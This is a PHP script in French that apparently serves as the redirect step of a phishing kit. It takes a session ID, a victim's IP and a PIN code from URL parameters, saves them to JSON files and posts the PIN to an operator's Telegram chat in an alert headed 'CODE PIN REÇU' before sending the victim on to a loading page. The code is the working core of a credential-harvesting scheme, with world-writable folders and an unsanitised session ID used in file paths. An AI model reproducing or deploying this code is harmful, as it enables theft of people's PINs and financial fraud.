<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
$pinCode = $_GET['pin'] ?? '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'redirect.php',
    'timestamp' => time(),
    'ip' => $clientIp,
    'pin_code' => $pinCode
];

// Créer le dossier tracking s'il n'existe pas
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

// Enregistrer le code PIN s'il est fourni
if (!empty($pinCode)) {
    $pinFile = 'pins/' . $sessionId . '_pin.json';
    if (!file_exists('pins')) {
        mkdir('pins', 0777, true);
    }
    
    $pinData = [
        'session' => $sessionId,
        'ip' => $clientIp,
        'pin_code' => $pinCode,
        'timestamp' => time(),
        'received_at' => date('Y-m-d H:i:s')
    ];
    
    file_put_contents($pinFile, json_encode($pinData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    
    // Envoyer le code PIN à Telegram
    $botToken = 'YOUR_BOT_TOKEN'; // Remplacez par votre token
    $chatId = 'YOUR_CHAT_ID'; // Remplacez par votre Chat ID
    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $message = "✅ <b>CODE PIN REÇU</b> ✅\n\n";
    $message .= "🔑 <b>Session ID:</b> <code>{$sessionId}</code>\n";
    $message .= "🌐 <b>IP Address:</b> <code>{$clientIp}</code>\n";
    $message .= "📱 <b>PIN Code:</b> <code>{$pinCode}</code>\n";
    $message .= "⏰ <b>Timestamp:</b> " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "✅ Redirection vers la page de chargement...";
    
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    curl_close($ch);
}

// Rediriger vers loading.php
header("Location: loading.php?session=" . htmlspecialchars($sessionId) . "&ip=" . htmlspecialchars($clientIp));
exit;
?>